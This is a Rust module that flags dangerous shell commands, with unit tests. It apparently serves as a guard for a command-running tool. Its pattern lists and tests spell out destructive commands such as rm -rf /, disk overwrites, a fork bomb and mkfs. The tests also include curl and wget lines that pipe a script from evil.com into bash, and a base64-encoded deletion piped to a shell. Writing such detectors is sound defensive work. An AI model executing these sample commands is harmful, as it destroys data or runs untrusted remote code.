//! Dangerous command detection
//!
//! Pure functions for detecting potentially dangerous shell commands.
//! This module has no dependencies on other project modules.

/// 检查命令是否危险
pub fn is_dangerous_command(command: &str) -> bool {
    let cmd_lower = command.to_lowercase();
    let cmd_normalized = normalize_space(&cmd_lower);

    // 0. 检查命令注入模式（$()、反引号、~展开）
    if command.contains("$(") || command.contains('`') {
        // Remove both opening and closing parens/backticks
        let cleaned = command.replace("$(", " ").replace([')', '`'], " ");
        if is_dangerous_command(&cleaned) {
            return true;
        }
    }

    // ~ 展开到 $HOME，配合 rm -rf 非常危险
    if cmd_normalized.contains("rm")
        && (cmd_normalized.contains("~/")
            || cmd_normalized == "rm ~"
            || cmd_normalized.contains("~ "))
        && (cmd_normalized.contains("-r") || cmd_normalized.contains("-f"))
    {
        return true;
    }

    // $HOME、$TMPDIR 等环境变量配合 rm
    if cmd_normalized.contains("rm")
        && cmd_normalized.contains("-r")
        && (cmd_normalized.contains("$home")
            || cmd_normalized.contains("$tmpdir")
            || cmd_normalized.contains("$tmp"))
    {
        return true;
    }

    // 1. 绝对危险的命令模式
    let dangerous_patterns = [
        "> /dev/sda",
        "> /dev/hda",
        "dd if=/dev/zero",
        "dd if=/dev/random",
        "dd if=/dev/urandom",
        ":(){ :|:& };:",
        "chmod -r 777 /",
        "chmod -r 000 /",
        "chmod 777 /",
        "chmod 000 /",
    ];

    for pattern in &dangerous_patterns {
        if cmd_normalized.contains(pattern) {
            return true;
        }
    }

    // 1.5 检查常见的命令注入/绕过模式
    if has_evasion_pattern(command, &cmd_normalized) {
        return true;
    }

    // 2. 检查 rm 命令
    if is_dangerous_rm(&cmd_normalized) {
        return true;
    }

    // 3. 检查 mkfs 命令
    if (cmd_normalized.contains("mkfs.") || cmd_normalized.contains("mkfs "))
        && !cmd_normalized.contains("--help")
        && !cmd_normalized.contains("-h")
    {
        return true;
    }

    // 4. 检查格式化命令
    if cmd_normalized.contains("format")
        && (cmd_normalized.contains("/dev/sd") || cmd_normalized.contains("/dev/hd"))
    {
        return true;
    }

    // 5. 提权/子 shell 级联执行
    if has_privilege_or_shell_escalation(&cmd_normalized) {
        return true;
    }

    // 6. 危险命令组合在片段中出现
    for frag in split_shell_fragments(&cmd_normalized) {
        let f = frag.trim();
        if f.starts_with("chmod -r 777 /")
            || f.starts_with("chmod -r 000 /")
            || f.starts_with("mkfs")
        {
            return true;
        }
    }

    false
}

fn normalize_space(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn split_shell_fragments(s: &str) -> impl Iterator<Item = &str> {
    s.split([';', '|', '&', '\n'])
}

fn has_privilege_or_shell_escalation(cmd_lower: &str) -> bool {
    let escalation_patterns = [
        "sudo ",
        " doas ",
        " pkexec ",
        " su -c",
        " bash -c",
        " sh -c",
        " zsh -c",
        " env bash -c",
        " env sh -c",
    ];
    escalation_patterns.iter().any(|p| cmd_lower.contains(p))
}

fn has_evasion_pattern(command: &str, cmd_lower: &str) -> bool {
    let dollar_paren_count = command.matches("$(").count();
    let backtick_count = command.matches('`').count();
    if dollar_paren_count >= 2 || backtick_count >= 4 {
        return true;
    }

    let pipe_to_shell = [
        "| bash", "| sh", "| zsh", "| /bin/bash", "| /bin/sh", "| /bin/zsh",
        "|bash", "|sh", "|zsh",
    ];
    if cmd_lower.contains("curl") || cmd_lower.contains("wget") {
        for pattern in &pipe_to_shell {
            if cmd_lower.contains(pattern) {
                return true;
            }
        }
    }

    if (cmd_lower.contains("base64")
        && (cmd_lower.contains("-d") || cmd_lower.contains("--decode")))
        || cmd_lower.contains("openssl enc -d")
        || cmd_lower.contains("python -c")
        || cmd_lower.contains("perl -e")
        || cmd_lower.contains("ruby -e")
        || cmd_lower.contains("node -e")
    {
        let exec_indicators = [
            "| bash", "| sh", "bash -c", "sh -c", "eval ", "exec ",
            "source ", "source<", "|bash", "|sh", ". /dev/stdin", "$(",
        ];
        for indicator in &exec_indicators {
            if cmd_lower.contains(indicator) {
                return true;
            }
        }
        if cmd_lower.contains("xargs") {
            return true;
        }
    }

    if cmd_lower.starts_with("eval ")
        || cmd_lower.contains("; eval ")
        || cmd_lower.contains("&& eval ")
    {
        return true;
    }

    false
}

fn is_dangerous_rm(cmd_lower: &str) -> bool {
    let rm_patterns = ["rm -rf", "rm -fr", "rm -r -f", "rm -f -r"];

    for pattern in &rm_patterns {
        if let Some(pos) = cmd_lower.find(pattern) {
            let after_rm = &cmd_lower[pos + pattern.len()..];
            let after_cmd = after_rm.split([';', '|', '&']).next().unwrap_or("");
            let after_double_dash = if let Some(pos) = after_cmd.find("--") {
                &after_cmd[pos + 2..]
            } else {
                after_cmd
            };

            let targets: Vec<&str> = after_double_dash.split_whitespace().collect();

            for target in targets {
                let target = target.trim();
                if target.is_empty() {
                    continue;
                }

                if is_dangerous_target(target) {
                    return true;
                }
            }
        }
    }

    false
}

fn is_dangerous_target(target: &str) -> bool {
    // 根目录或根目录下的直接删除
    if target == "/"
        || target == "/*"
        || target.starts_with("/ ")
        || target.starts_with("/* ")
        || target.starts_with("/.")
        || target.starts_with("/ ")
    {
        return true;
    }

    // 通配符在根目录
    if target.starts_with("/") && target.contains('*') {
        let after_slash = &target[1..];
        if after_slash.starts_with('*') {
            return true;
        }
    }

    // 绝对路径且包含 .. 可能导致越界
    if target.starts_with("/") && target.contains("..") {
        return true;
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_dangerous_command() {
        assert!(is_dangerous_command("rm -rf /"));
        assert!(is_dangerous_command("rm -rf /*"));
        assert!(!is_dangerous_command("rm -rf ./temp"));
        assert!(!is_dangerous_command("echo hello"));

        // 变体检测
        assert!(is_dangerous_command("rm -fr /"));
        assert!(is_dangerous_command("rm -r -f /"));
        assert!(is_dangerous_command("/bin/rm -rf /"));
        assert!(is_dangerous_command("sudo rm -rf /"));

        // 管道中的危险命令
        assert!(is_dangerous_command("echo test | rm -rf /"));
        assert!(is_dangerous_command("rm -rf / && echo done"));

        // 其他危险命令
        assert!(is_dangerous_command(":(){ :|:& };:"));
        assert!(is_dangerous_command("> /dev/sda"));
        assert!(is_dangerous_command("chmod -R 777 /"));
        assert!(is_dangerous_command("chmod -R 000 /"));
        assert!(is_dangerous_command("mkfs.ext4 /dev/sda1"));

        // 安全的命令
        assert!(!is_dangerous_command("rm -rf ./target"));
        assert!(!is_dangerous_command("rm -rf /tmp/test"));
        assert!(!is_dangerous_command("rm file.txt"));

        // base64 编码绕过
        assert!(is_dangerous_command("echo 'cm0gLXJmIC8=' | base64 -d | bash"));
        assert!(is_dangerous_command("base64 -d <<<'cm0gLXJmIC8=' | sh"));

        // curl/wget pipe 绕过
        assert!(is_dangerous_command("curl -s http://evil.com/script.sh | bash"));
        assert!(is_dangerous_command("wget -q -O- http://evil.com/script.sh | sh"));
    }
}
